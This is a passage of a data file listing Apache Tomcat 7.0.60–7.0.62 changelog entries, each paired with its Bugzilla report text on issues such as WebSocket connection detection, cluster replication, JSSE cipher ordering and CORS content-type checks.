Jasper|Tomcat 7.0.62 (violetagg)|fix|57845|Ensure that, if the same JSP is accessed directly and via a <jsp-file> declaration in web.xml, updates to the JSP are visible (subject to the normal rules on re-compilation) regardless of how the JSP is accessed. (markt)|Multiple JspServletWrapper's sharing one JspCompilationContext|"Copied from http://stackoverflow.com/questions/24567224/tomcat-serving-cached-alias:

Setup:  One jsp served at multiple urls:

<welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
</welcome-file-list>
<servlet>
    <servlet-name>Main</servlet-name>
    <jsp-file>/index.jsp</jsp-file>
</servlet>
<servlet-mapping>
    <servlet-name>Main</servlet-name>
    <url-pattern>/advanced/</url-pattern>
</servlet-mapping>

When I change the contents of index.jsp and visit /, it is updated.  Then when I visit /advanced/ it is not updated.  I expect both URL's contents to be updated.  If I change index.jsp again and visit /advanced/ first, it is up-to-date, but / is not.

I spent some time in org.apache.jasper.compiler.Compiler#isOutDated(boolean), and I've found that only the first URL that I visit is the one that is marked outDated. The second URL I visit is never marked outDated. So it's as if tomcat keeps two instances of JspServlet but share the same outDated information for the file, so when one JspServlet marks it as outDated and sets reload, the second JspServlet never recompiles it nor serves the recompiled version.

(Also happened in 7.0.47 and some earlier versions of Tomcat7.  Never tried it on Tomcat6 or 8.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57845
Jasper|Tomcat 7.0.62 (violetagg)|fix|57855|Explicitly handle the case where a MethodExpression is invoked with null or the wrong number of parameters. Rather than failing with an ArrayIndexOutOfBoundsException or a NullPointerException throw an IllegalArgumentException with a useful error message. (markt)|Invoke MethodExpression with wrong pram count results in ArrayIndexOutOfBoundsException|"To reproduce add the following test code to TestMethodExpressionImpl:

@Test(expected=IllegalArgumentException.class)
public void test() {
    MethodExpression me = factory.createMethodExpression(context,
            ""${beanAA.echo2}"", null , new Class[]{String.class});
    me.invoke(context, new Object[0]);
}

The result is an ArrayIndexOutOfBoundsException. I would expect an IllegalArgumentException or a MethodNotFoundException.
The same I would expect if I invoke with null:

@Test(expected=IllegalArgumentException.class)
public void testNull() {
    MethodExpression me = factory.createMethodExpression(context,
            ""${beanAA.echo2}"", null , new Class[]{String.class});
    me.invoke(context, null);
}

But this throws a NullPointerException instead.
I run into this because PrimeFaces handles AjaxListeners relatively bad and expect that there is a MethodNotFoundException or an IllegalArgumentException if they call a listener method with no pram.

try {
    listener.invoke(elContext, new Object[]{});
} 
catch (MethodNotFoundException mnfe) {
    processArgListener(context, elContext, event);
} 
catch (IllegalArgumentException iae) {
    processArgListener(context, elContext, event);
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57855
Cluster|Tomcat 7.0.62 (violetagg)|add||Add new attribute that send all actions for session across Tomcat cluster nodes. (kfujino)|||
Cluster|Tomcat 7.0.62 (violetagg)|fix||Remove unused pathname attribute in mbean definition of BackupManager. (kfujino)|||
Cluster|Tomcat 7.0.62 (violetagg)|fix|57338|Improve the ability of the ClusterSingleSignOn valve to handle nodes being added and removed from the Cluster at run time. (markt)|SingleSignOnEntry cache of ClusterSingleSignOn valve is not synchronized on Tomcat startup|"When using the ClusterSingleSignOn valve, it looks like the single sign on session state is not synchronized to cluster nodes when they start. The state is instead only replicated at the moment that an action is performed, so any nodes that come online after that action are out of sync.

See mailing list discussion here: http://www.mail-archive.com/users@tomcat.apache.org/msg115472.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57338
Cluster|Tomcat 7.0.62 (violetagg)|fix||Avoid unnecessary call of DeltaRequest.addSessionListener() in non-primary nodes. (kfujino)|||
WebSocket|Tomcat 7.0.62 (violetagg)|fix|57762|Ensure that the WebSocket client correctly detects when the connection to the server is dropped. (markt)|WebSocket client doesn't detect forceful connection failures|"It appears that the WebSocket client can't detect when a connection is forcefully closed. Given the following example program:

public class App2 {
    @ClientEndpoint
    public static class Client {
        @OnClose
        public void onClose() {
        	System.out.println(""CLOSED"");
        }
        
        @OnError
        public void onError(Throwable t) {
        	System.out.println(""ERROR: "" + t);
        }
    }

    public static void main(final String[] args) throws Exception {
        final WebSocketContainer container = ContainerProvider.getWebSocketContainer();
        System.out.println(""Container: "" + container);
        container.connectToServer(
                Client.class,
                URI.create(""ws://echo.websocket.org/""));
        Thread.sleep(Long.MAX_VALUE);
    }
}

I then modified /etc/hosts so that echo.websocket.org resolved to localhost. I then set up an SSH tunnel to direct local port 80 to echo.websocket.org (which is 174.129.224.73):

sudo ssh me@someserver -L 80:174.129.224.73:80

I then started the program. It connected. Next, I killed the SSH session. Neither the onClosed on onError methods were invoked.

When I tested the same program running on Tyrus 1.10, however, onClose was invoked with a CloseReason 10006 - Closed Abnormally.

I think the Tyrus behavior is correct - the socket is dead and the program should be notified."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57762
WebSocket|Tomcat 7.0.62 (violetagg)|fix|57776|Revert the 8.0.21 fix for the permessage-deflate implementation and incorrect op-codes since the fix was unnecessary (the bug only affected trunk) and the fix broke rather than fixed permessage-deflate if an uncompressed message was converted into more than one compressed message. (markt)|Fragmented message error|"Vaadin 7.4.2 webapp runs perfectly in Tomcat 8.0.20 repeatedly evokes IllegalStateException in Tomcat 8.0.21:

Exception in thread ""WebSocketServer-localhost-/vfc-6"" java.lang.IllegalStateException: When sending a fragmented message, all fragments bust be of the same type
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.writeMessagePart(WsRemoteEndpointImplBase.java:411)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.endMessage(WsRemoteEndpointImplBase.java:366)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase$IntermediateMessageHandler.onResult(WsRemoteEndpointImplBase.java:513)
	at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer$OnResultRunnable.run(WsRemoteEndpointImplServer.java:247)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)

Rolling back to 8.0.20 but retaining Tomcat Native 1.1.33 restores error-free webapp operation.  I haven't isolated a simple example as the webapp mostly works and I don't yet know what triggers the error.  The offending function generates new threads, access a database, creates various forms and uses WebSocket to push data to other user interfaces.  I understand I have provided insufficient information to qualify as a bug report, but please take it as a data point, in case you receive other similar reports."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57776
WebSocket|Tomcat 7.0.62 (violetagg)|fix||Fix log name typo in WsRemoteEndpointImplServer class, caused by a copy-paste. (markt/kkolinko)|||
WebSocket|Tomcat 7.0.62 (violetagg)|fix|57788|Avoid NPE when looking up a class hierarchy without finding anything. (remm)|NPE on session.addMessageHandler|"The NPE is throwed when then MessageHandler has no Generic Class.

java.lang.NullPointerException
	at org.apache.tomcat.websocket.Util.getGenericType(Util.java:192)
	at org.apache.tomcat.websocket.Util.getGenericType(Util.java:212)
	at org.apache.tomcat.websocket.Util.getGenericType(Util.java:212)
	at org.apache.tomcat.websocket.Util.getGenericType(Util.java:212)
	at org.apache.tomcat.websocket.Util.getMessageType(Util.java:171)
	at org.apache.tomcat.websocket.WsSession.addMessageHandler(WsSession.java:198)

Please check on the Util class line 210. The call clazz.getSuperclass() returns null if clazz is a Object class (see JDK Javadoc)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57788
WebSocket|Tomcat 7.0.62 (violetagg)|add||Make WebSocket client more robust when handling errors during the close of a WebSocket session. (markt)|||
Web applications|Tomcat 7.0.62 (violetagg)|add|57759|Add information to the keyAlias documentation to make it clear that the order keys are read from the keystore is implementation dependent. (markt)|Clarify keyAlias definition to reduce likelihood of readers making invalid assumptions|"keyAlias Definition from: 

https://tomcat.apache.org/tomcat-7.0-doc/config/http.html

The alias used to for the server certificate in the keystore. If not specified the first key read in the keystore will be used.

Wouldn't this lead you to believe if no alias is specified it will use the first key in the keystore?  This is not the case.

Steps to recreate:

Create a keystore using the recommended method: 

%JAVA_HOME%\bin\keytool"" -genkey -alias tomcat -keyalg RSA

(This will generate ${user.home}/.keystore if it does not exist.  If it does, specify the keystore value.)

Start tomcat with the default SSL connector defined, no ""keyAlias"" value specified, and the keystore we created previous specified as the keystoreFile.

It will use the cert in the file.

Add another cert (specify different name and values to differentiate between the two) to the keystore with :

%JAVA_HOME%\bin\keytool"" -genkey -alias tomcat2 -keyalg RSA

Shutdown and restart the tomcat instance.

Access the SSL site ""localhost:8443"", inspect the cert.  You will see it is not the first certificate in the keystore like the document leads you to believe, but the last one added, no matter how many you add."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57759
Web applications|Tomcat 7.0.62 (violetagg)|fix|57864|Update the documentation web application to make it clearer that hex values are not valid for cluster send options. Based on a patch by Kyohei Nakamura. (markt)|channelSendOptions attribute is not able to be configured in hexadecimal|"Created attachment 32693 [details]
patch against trunk.

The Cluster configuration document have shown that the channelSendOptions attribute of SimpleTcpCluster element can be configured in hexadecimal.
http://tomcat.apache.org/tomcat-8.0-doc/config/cluster.html

Digester set the value using IntrospectionUtils.setProperty method.
SimpleTcpCluster.setChannelSendOptions method takes an int argument.

Therefore, setProperty method will be attempted to convert hexadecimal using Constructor of Integer Class (See Integer(String s)).
As a result, hexadecimal value will cause a NumberFormatException.

So, the channelSendOptions is not able to be configured in hexadecimal.

On the other hand, when GroupChannel is used on Tomcat, the channelSendOptions will be set 10 or less (SYNC or ASYNC, ACK or Non-ACK), and it will be not set more than 10.
Therefore, the example for hexadecimal (""0x000B"") can be remove from the configuration document."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57864
Tribes|Tomcat 7.0.62 (violetagg)|fix||Fix a concurrency issue when a backup message that has all session data and a backup message that has diff data are processing at the same time. This fix ensures that MapOwner is set to ReplicatedMapEntry. (kfujino)|||
Tribes|Tomcat 7.0.62 (violetagg)|fix||Clarify the handling of Copy message and Copy nodes. (kfujino)|||
Tribes|Tomcat 7.0.62 (violetagg)|fix||Copy node does not need to send the entry data. It is enough to send only the node information of the entry. (kfujino)|||
Tribes|Tomcat 7.0.62 (violetagg)|fix||ReplicatedMap should send the Copy message when replicating. (kfujino)|||
Tribes|Tomcat 7.0.62 (violetagg)|fix||Fix behavior of ReplicatedMap when member has disappeared. If map entry is primary, rebuild the backup members. If primary node of map entry has disappeared, backup node is promoted to primary. (kfujino)|||
Tribes|Tomcat 7.0.62 (violetagg)|fix||When a map member has been added to ReplicatedMap, make sure to add it to backup nodes list of all other members. (kfujino)|||
Catalina|Tomcat 7.0.61 (violetagg)|fix|55988|Correct the check used for Java 8 JSSE server-preferred TLS cipher suite ordering. Ensure that SSL parameters are provided to SSLServerSocket and SSLEngine. Patch provided by Ognjen Blagojevic. (violetagg)|Add parameter useCipherSuitesOrder to JSSE (BIO and NIO) connectors [PATCH]|"Starting with Oracle Java 1.8.0 B108, JSSE supports server-side cipher ordering [1]. Server-side cipher ordering is useful for enabling Forward Secrecy and for preventing certain attacks. Appropriate JSSE parameter is called useCipherSuitesOrder [2].

Is it possible to add that same attribute to Tomcat JSSE connectors?

The problem is that parameter useCipherSuitesOrder is only available starting with Java 1.8 B108, while Tomcat 8 requires only Java 1.7. Therefore the proposal is, if Tomcat 8:

(a) runs using Java 1.7 / 1.8 pre-B108, parameter useCipherSuitesOrder would be ignored, and if 
(b) runs using Java 1.8 B108+, JSSE parameter useCipherSuitesOrder would be appropriately set.

It might be a precedence to support parameter from non-required version of Java, albeit -- due to the usefulness of such configuration option -- it might be worthwhile considering.

Note that similar attribute already exists for APR connector -- SSLHonorCipherOrder.

-Ognjen

[1] https://bugs.openjdk.java.net/browse/JDK-7188657
[2] http://download.java.net/jdk8/docs/api/javax/net/ssl/SSLParameters.html#setUseCipherSuitesOrder-boolean-"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55988
WebSocket|Tomcat 7.0.61 (violetagg)|fix|57761|Ensure that the opening HTTP request is correctly formatted when the WebSocket client connects to a server root. (remm)|WebSocket client won't connect to URLs that don't end in a slash (/)|"The following program won't work on Tomcat's WebSocket client jars, both 8.0.20 and Trunk:

public class App2 {
    @ClientEndpoint
    public static class Client {
        @OnOpen
        public void onOpen(Session s) throws Exception {
            System.out.println(""Sending PING"");
            s.getBasicRemote().sendText(""PING"");
        }

        @OnMessage
        public void onMessage(Session s, String msg) throws Exception {
            System.out.println(""GOT: "" + msg);
            Thread.sleep(1000);
            s.getBasicRemote().sendText(""PING"");
            System.out.println(""Sending PING"");
        }
    }

    public static void main(final String[] args) throws Exception {
        ContainerProvider.getWebSocketContainer().connectToServer(
                Client.class,
                URI.create(""ws://echo.websocket.org""));
        Thread.sleep(Long.MAX_VALUE);
    }
}

It fails with:

Exception in thread ""main"" javax.websocket.DeploymentException: The
HTTP request to initiate the WebSocket connection failed
    at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:357)
    at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:164)
    at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:181)
    at io.davinci.test_sync_gateway_websocket.App2.main(App2.java:31)
Caused by: java.io.EOFException
    at org.apache.tomcat.websocket.WsWebSocketContainer.processResponse(WsWebSocketContainer.java:606)
    at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:309)
    ... 3 more


If you add a slash to the end of the URL, however, it connects."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57761
Catalina|Tomcat 7.0.60 (violetagg)|fix||Clarify threaded usage of variables by removing volatile marker in NonceInfo. Issue reported by Coverity Scan. (fschumacher)|||
Catalina|Tomcat 7.0.60 (violetagg)|add|49785|Enable StartTLS connections for JNDIRealm. (fschumacher)|Enable STARTTLS for JNDIRealm|"Created attachment 25916 [details]
InitialContextFactory which produces TLS enabled LdapContext instances

To enable TLS for LDAP inside JNDIRealm one has to either patch JNDIRealm directly and introduce another state variable to hold TLS-state - and thus make introduction of pooling harder, or use a factory which produces TLS enabled DirContext instances.

Such a factory is attached. It can be configured by specifying a contextFactory in JNDIRealm config:
 &lt;Realm
   ...
   contextFactory=""org.apache.catalina.realm.LdapTlsContextFactory""
   ...
   /&gt;

I think it would be a good idea to add a parameter startTLS to JNDIRealm, which would automatically use the above TLS-ContextFactory. If wanted, I could supply a patch.

(the patch is against tomcat 6.0.x trunk, but I think it will apply fine to trunk too)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49785
Catalina|Tomcat 7.0.60 (violetagg)|fix|55988|Add support for Java 8 JSSE server-preferred TLS cipher suite ordering. This feature requires Java 8 and is controlled by useServerCipherSuitesOrder attribute on an HTTP connector. Based upon patches provided by Ognjen Blagojevic. (schultz)|Add parameter useCipherSuitesOrder to JSSE (BIO and NIO) connectors [PATCH]|"Starting with Oracle Java 1.8.0 B108, JSSE supports server-side cipher ordering [1]. Server-side cipher ordering is useful for enabling Forward Secrecy and for preventing certain attacks. Appropriate JSSE parameter is called useCipherSuitesOrder [2].

Is it possible to add that same attribute to Tomcat JSSE connectors?

The problem is that parameter useCipherSuitesOrder is only available starting with Java 1.8 B108, while Tomcat 8 requires only Java 1.7. Therefore the proposal is, if Tomcat 8:

(a) runs using Java 1.7 / 1.8 pre-B108, parameter useCipherSuitesOrder would be ignored, and if 
(b) runs using Java 1.8 B108+, JSSE parameter useCipherSuitesOrder would be appropriately set.

It might be a precedence to support parameter from non-required version of Java, albeit -- due to the usefulness of such configuration option -- it might be worthwhile considering.

Note that similar attribute already exists for APR connector -- SSLHonorCipherOrder.

-Ognjen

[1] https://bugs.openjdk.java.net/browse/JDK-7188657
[2] http://download.java.net/jdk8/docs/api/javax/net/ssl/SSLParameters.html#setUseCipherSuitesOrder-boolean-"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55988
Catalina|Tomcat 7.0.60 (violetagg)|add|56438|Add logging that reports when a JAR is scanned for TLDs but nothing is found so that Tomcat may be configured to skip this JAR in future. Based on a patch by VIN. (markt)|If jar scan does not find context config or TLD config, log a message|"I went through the same process as many others migrating to Tomcat 7. My simple war application took orders of magnitude longer to load than in Tomcat 3.3, and root cause was new Tomcat 7 / Servlet 3.0 jar scanning to look for context config fragments.

This is a very painful process. I had to use FINE log level, parse thousands of Tomcat log messages, and google the various messages. This was a waste of time. All Tomcat 7 needed to do was log a message when the jar scan did not find anything in a jar, and recommend adding that jar to one of the filters in catalina.properties.

  tomcat.util.scan.DefaultJarScanner.jarsToSkip
  org.apache.catalina.startup.ContextConfig.jarsToSkip
  org.apache.catalina.startup.TldConfig.jarsToSkip.


As an enhancement, please add a log message recommending adding a jar if scanning does not find anything. I would recommend setting the log level to FINE, and explicitly putting a logging.properties override for that message in logging.properties. Anyone new to Tomcat 7 can fix these messages by either following the recommendation, or commenting out the logging.properties override for the message.

This is low hanging fruit. It should be straight forward to add, and would be a huge help for anyone new to Tomcat 7 who are unaware of the performance impact of Servlet 3.0 jar scanning. It could even help Tomcat 7 veterans too, when they add/upgrade/replace existing jar files that unknowingly affect jar scanning performance.

Thank you."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56438
Catalina|Tomcat 7.0.60 (violetagg)|fix|56848|Use Locale.forLanguageTag to process Locale headers when running on a Java 7 or later JRE. (markt)|Tomcat accept-language parsing doesn't properly handle IETF BCP47 language tags|"Microsoft started using IETF BCP 47 language tags in Windows 8, so for languages such as Chinese Traditional (formerly zh-CN) and Chinese Simplified (formerly zh-TW) the default language tags are now zh-hant-CN and zh-hans-TW respectively.

The tomcat accept-language parsing method Request.parseLocalHeaders doesn't handle these tags properly.

Here's the bcp 47 spec:
http://tools.ietf.org/html/bcp47

And here's a description of some of the changes in Java 7 for this:
http://docs.oracle.com/javase/tutorial/i18n/locale/create.html

Where Java 7 is involved, the Locale.forLanguageTag method
http://docs.oracle.com/javase/7/docs/api/java/util/Locale.html#forLanguageTag(java.lang.String)

works well assuming a fully compliant language tag.  Perhaps Tomcat should try to make use of this via reflection instead of parsing the entry?  The grammar for bcp47 tags doesn't make for easy parsing as various subsections of the tag are only valid if they match to particular ISO codes.
see:
http://tools.ietf.org/html/bcp47#section-2.1"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56848
Catalina|Tomcat 7.0.60 (violetagg)|add|57021|Improve logging in AprLifecycleListener and jni.Library when Tomcat-Native DLL fails to load. Based on a patch by Pravallika Peddi. (markt/kkolinko)|Improve logging in AprLifecycleListener and jni.Library when Tomcat-Native DLL fails to load|"I occasionally used a version of Tomcat-Native DLL that JVM failed to initialize. The error was logged to stderr, but to none of our log files.

Steps to reproduce with 8.0.14 on Windows with JDK 7u67:

1. Get a wrong version of tcnative-1.dll and put it into %CATALINA_HOME%/bin directory. I erroneously used a x64 DLL with a x86 JDK.

2. Start Tomcat and log output into a file:
cd bin
catalina.bat run >catalina.out 2>&1

3. Stop Tomcat
Ctrl+C or catalina.bat stop

4. Actual: An error (cited below) was logged onto console (catalina.out) but it is not present in catalina.2014-09-25.log file. The only relevant message in catalina.2014-09-25.log was ""The APR based Apache Tomcat Native library <...> was not found on the java.library.path: <...>.

Expected: A properly logged error.

Looking in the source code,
1) In AprLifecycleListener.init() the Throwable is caught but not logged.
2) The exception is printed by org.apache.tomcat.jni.Library.Library() constructor. The code looks like the following:

[[[
                String name = System.mapLibraryName(NAMES[i]);
                String path = System.getProperty(""java.library.path"");
                String sep = System.getProperty(""path.separator"");
                String [] paths = path.split(sep);
                for (int j=0; j<paths.length; j++) {
                    java.io.File fd = new java.io.File(paths[j] , name);
                    if (fd.exists()) {
                        t.printStackTrace();
                    }
                }
                if ( i > 0)
                    err.append("", "");
                err.append(t.getMessage());
<...>
        if (!loaded) {
            err.append('(');
            err.append(System.getProperty(""java.library.path""));
            err.append(')');
            throw new UnsatisfiedLinkError(err.toString());
        }
]]]

The loop with ""fd.exists()"" does essentially the same thing that JRE itself is doing in loadLibrary() to locate the library file before actually trying to load it.

Thoughts on possible improvement:
===================================

A. Treat the case when ""fd.exists()"" as fatal and rethrow original exception.

This will change behaviour in case when both ""tcnative-1"" and ""libtcnative-1"" libraries are present in ""java.library.path"" directories and the first library fails to load while the second one succeeds.

With the current code it will print an error for the first library and may silently successfully load the second one. With the change that I am proposing it will fail with the first library without trying the second one.

I say that configuration with both libraries being present is unlikely,  and as it was printing an error for the first library I say that such configuration is a broken one.

Rethrowing original exception will provide better diagnostics (if AprLifecycleListener is modified to log it) and will remove printing to System.err.


B. Replace ""throw new UnsatisfiedLinkError(err.toString());"" with a custom Error class e.g. LibraryNotFoundError extends UnsatisfiedLinkError.

- Include original exceptions and library names into LibraryNotFoundError.

- Use this class in AprLifecycleListener to discern between UnsatisfiedLinkError from failed attempt to load a library versus the common ""library does not exist"" scenario.

In the former case, log it as a warning. In the latter case print original exceptions if debug logging is enabled. The usual informational message follows.


C. Simplify AprLifecycleListener class and call Library.initialize(null) directly without relying on reflection.

There are already references to the fields such as Library.APR_MAJOR_VERSION further in the code. There is no point in using reflection is this case.

In the unlikely case that tomcat-jni.jar is not on classpath, AprLifecycleListener should not be present in server.xml as well. In this case Connector.<init> will call AprLifecycleListener.isAprAvailable() but the call to init() will not be performed. It should succeed even if Library class is not on classpath.



For reference, the error message with 8.0.14 (with some path censoring) was:
========================
[[[
java.lang.UnsatisfiedLinkError: <CATALINA_HOME>\bin\tcnative-1.dll: Can't load AMD 64-bit .dll on a IA 32-bit platform
	at java.lang.ClassLoader$NativeLibrary.load(Native Method)
	at java.lang.ClassLoader.loadLibrary1(ClassLoader.java:1965)
	at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1890)
	at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1880)
	at java.lang.Runtime.loadLibrary0(Runtime.java:849)
	at java.lang.System.loadLibrary(System.java:1088)
	at org.apache.tomcat.jni.Library.<init>(Library.java:40)
	at org.apache.tomcat.jni.Library.initialize(Library.java:172)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.catalina.core.AprLifecycleListener.init(AprLifecycleListener.java:203)
	at org.apache.catalina.core.AprLifecycleListener.isAprAvailable(AprLifecycleListener.java:105)
	at org.apache.catalina.connector.Connector.setProtocol(Connector.java:564)
	at org.apache.catalina.connector.Connector.<init>(Connector.java:66)
	at org.apache.catalina.startup.ConnectorCreateRule.begin(ConnectorCreateRule.java:62)
...
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57021
Catalina|Tomcat 7.0.60 (violetagg)|fix|57180|Further fixes to support the use of arbitrary HTTP methods with the CORS filter. (markt)|CorsFilter does not support PATCH method|The CorsFilter provided with Tomcat 7 should support the PATCH method.|https://bz.apache.org/bugzilla/show_bug.cgi?id=57180
Catalina|Tomcat 7.0.60 (violetagg)|add||Warn about problematic setting of appBase. (fschumacher)|||
Catalina|Tomcat 7.0.60 (violetagg)|fix|57534|CORS Filter should only look at media type component of Content-Type request header. (markt)|CorsFilter.SIMPLE_HTTP_REQUEST_CONTENT_TYPE_VALUES check shall ignore content-type parameters|"In CorsFilter of trunk

starting with line 1030:
[[[
    /**
     * {@link Collection} of Simple HTTP request headers. Case in-sensitive.
     *
     * @see  <a href=""http://www.w3.org/TR/cors/#terminology""
     *       >http://www.w3.org/TR/cors/#terminology</a>
     */
    public static final Collection<String> SIMPLE_HTTP_REQUEST_CONTENT_TYPE_VALUES =
            new HashSet<>(Arrays.asList(""application/x-www-form-urlencoded"",
                    ""multipart/form-data"", ""text/plain""));
]]]

starting with line 641:
[[[
                    } else if (""POST"".equals(method)) {
                        String contentType = request.getContentType();
                        if (contentType != null) {
                            contentType = contentType.toLowerCase().trim();
                            if (SIMPLE_HTTP_REQUEST_CONTENT_TYPE_VALUES
                                    .contains(contentType)) {
                                requestType = CORSRequestType.SIMPLE;
                            } else {
                                requestType = CORSRequestType.ACTUAL;
                            }
                        }
                    } else {
]]]

According to w3.org ""Terminology"" link above,
1) Javadoc for SIMPLE_HTTP_REQUEST_CONTENT_TYPE_VALUES is a bit off (copy-pasted from another field). It is actually a collection of mime-type values for Content-Type header so that this header is treated as a ""simple header""

2) The check using SIMPLE_HTTP_REQUEST_CONTENT_TYPE_VALUES shall ignore any parameters that may be present in Content-Type header value.

E.g. ""Content-Type: application/x-www-form-urlencoded; charset=UTF-8""  shall match successfully."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57534
Catalina|Tomcat 7.0.60 (violetagg)|fix||Ensure that user name checking in the optional SecurityListener is case-insensitive (as documented) and than the case-insensitive comparison is performed using the system default Locale. (markt)|||
Catalina|Tomcat 7.0.60 (violetagg)|fix||"When docBase refers internal war and unpackWARs is set to false, avoid registration of the invalid redeploy resource that has been added "".war"" extension in duplicate. (kfujino)"|||
Catalina|Tomcat 7.0.60 (violetagg)|fix||If WAR exists, it is not necessary to trigger a reload when adding a Directory. (kfujino)|||
Catalina|Tomcat 7.0.60 (violetagg)|fix|56608|When deploying an external WAR, add watched resources in the expanded directory based on whether the expanded directory is expected to exist rather than if it does exist.|WatchedResource configured in $TomcatHome\conf\Catalina\localhost context XML file not triggering context reload after working for several days|"Created attachment 31700 [details]
Log files for the day the error occurred and context reloading stopped being automatic.  Context file for app in question included.

I have set up a context XML file within $TOMCAT_HOME\conf\Catalina\localhost which has a docbase on a network fileshare.  I have set up a WatchedResource for a handful of files on this fileshare so that whenever one of the files is updated, the context is refreshed.  This works fine for sometime, but after a while, I see an error in the logs saying ""java.io.IOException: The semaphore timeout period has expired"" (Log file with full stack trace is uploaded).

After we notice this error, I had to start the context back via the Tomcat manager (to be expected, since it appears that a short network unavailability caused the issue).  However, once the application is started manually, the WatchedResources being updated no longer force the context to reload.  We have to reload the context manually until we do a full restart of the Tomcat service."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56608
Catalina|Tomcat 7.0.60 (violetagg)|fix||When triggering a reload due to a modified watched resource, ensure that multiple changed watched resources only trigger one reload rather than a series of reloads.|||
Catalina|Tomcat 7.0.60 (violetagg)|fix|57601|Ensure that HEAD requests return the correct content length (i.e. the same as for a GET) when the requested resource includes a resource served by the Default servlet. (jboynes/markt)|DefaultServlet returns no content when included during a HEAD request|"During a HEAD request, when a RequestDispatcher include is handled by the DefaultServlet the content of the static resource is not written to the HttpServletResponse. If the including servlet has wrapped the response before performing the include it will not receive the content of the resource.

This causes an issue for the JSTL <c:import> tag when a relative url is used in order to retrieve the resource, for example for use with the <x:parse> tag. Bug 37466 describes this case.

It is also a problem for other requests where the response headers may be affected by this lack of content causing different header values to be returned for GET vs. HEAD methods. For example, the Content-Length header does not account for bytes that are emitted by the included resource."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57601
Catalina|Tomcat 7.0.60 (violetagg)|fix|57602|Ensure that HEAD requests return the correct content length (i.e. the same as for a GET) when the requested resource includes a resource served by a servlet that extends HttpServlet. (markt)|HttpServlet returns no content when included during a HEAD request|Similar to bug 57601 the default implementation of doHead() in HttpServlet always suppresses output. This prevents a servlet that includes another's output from receiving the content especially if it has wrapped the response in order to capture the data.|https://bz.apache.org/bugzilla/show_bug.cgi?id=57602
Catalina|Tomcat 7.0.60 (violetagg)|fix|57621|When an async request completes, ensure that any remaining request body data is swallowed. (markt)|RE: Chunked encoding bug in tomcat embedded/spring MVC|"Here's the message and its replies that I posted to the tomcat-users mailing list. The verbose description of the bug is in my original message and the actual lines of code that would fix it if they were run are included in my final followup at the bottom.

> > From: Mark Thomas [mailto:markt@apache.org] On 19/02/2015 13:05, 
> > andrew-c.brown@ubs.com wrote:
> > > Not sure whether the responsibility lies here or with spring so I 
> > > thought I'd ask here first. Here's the scenario.
> > >
> > > We have a Jetty 9.2.7 async reverse proxy. It always sends back to 
> > > the servers behind using chunked encoding.
> > >
> > > We have backend servers built around embedded 7.0.23 (also tested 
> > > the latest 7.0.59).
> > >
> > > Jetty is configured to make SSL connections to these servers. SSL 
> > > is not the issue, though it may make it easier to reproduce. I can 
> > > reproduce this issue at will.
> > >
> > > Our backend servers are using Spring MVC with automatic argument 
> > > assignment where some argument values come from decoded JSON in
> the
> > > body. For example:
> > >
> > > @RequestMapping(method = RequestMethod.PUT, value = SOME_URL)
> > >
> > > public @ResponseBody WebAsyncTask<SomeObject>
> > ourMethod(@RequestBody
> > > @Valid final SomeObject f, @Min(1) @PathVariable(SOME_ID) final 
> > > long someId, final HttpServletRequest request) {
> > >
> > > }
> > >
> > > Here's the issue.
> > >
> > > Using Wireshark I noticed that quite often the first TCP segment 
> > > passed from Jetty to the backend server contained the entire PUT 
> > > request
> > > **except** (and this is important) the final 7 bytes chunk terminator.
> > > That arrives in the next segment on the wire.
> > >
> > > \r\n
> > > 0
> > > \r\n
> > > \r\n
> > >
> > > The nearly-complete segment causes Tomcat to wake up and start 
> > > processing the request. To cut a very long call stack short, the 
> > > automatic method argument assignment kicks into life and runs the 
> > > Jackson JSON parser to read the incoming body data using 
> > > org.apache.coyote.http11.filters.ChunkedInputFilter. Enough data 
> > > is present in the buffer to fully process the request so our 
> > > method is called with all the correct parameters and it does its 
> > > stuff and sends back a response.
> > >
> > > That's where it should end, but it doesn't.
> > >
> > > The remaining 7 bytes arrive on the wire and wake up Tomcat's NIO 
> > > loop again. Tomcat thinks it's a new request since the previous 
> > > one has been completely handled. This causes a 400 Bad Request to 
> > > be sent back up the wire following on from the correct response, 
> > > and the connection is terminated which causes a closed connection 
> > > to be present in Jetty's connection pool. That's bad.
> > >
> > > My opinion is that the Jackson JSON parser shouldn't have to care 
> > > about the type of stream it's reading from so the responsibility 
> > > should be with the chunked input stream to ensure that it doesn't 
